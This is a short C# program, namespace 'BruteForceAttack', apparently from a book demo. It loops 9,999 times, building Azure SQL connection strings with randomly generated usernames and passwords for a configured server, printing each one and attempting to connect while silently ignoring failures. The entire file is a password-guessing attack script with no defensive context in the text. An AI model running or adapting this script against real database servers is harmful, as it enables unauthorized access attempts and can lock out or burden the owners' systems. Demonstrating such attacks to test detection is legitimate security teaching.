using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration;

namespace BruteForceAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            for (int i = 1; i < 10000; i++)
            {
                try
                {
                    string _server = ConfigurationSettings.AppSettings["Server"].ToString();
                    string _database = ConfigurationSettings.AppSettings["database"].ToString();
                    string _user = RandomString(5);
                    string _password = RandomString(10);
                    string _Constr = "Server=tcp:" + _server + ".database.windows.net;Database=" + _database +";User ID =" +_user + "@packtdbserver;Password="+ _password + ";Trusted_Connection=False;Encrypt=True;";
                    Console.WriteLine(_Constr);
                    SqlConnection _con = new SqlConnection(_Constr);
                    _con.Open();
                }


                catch
                {
                    //Do nothing
                }
            }

        }

        private static Random random = new Random();
        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }


}
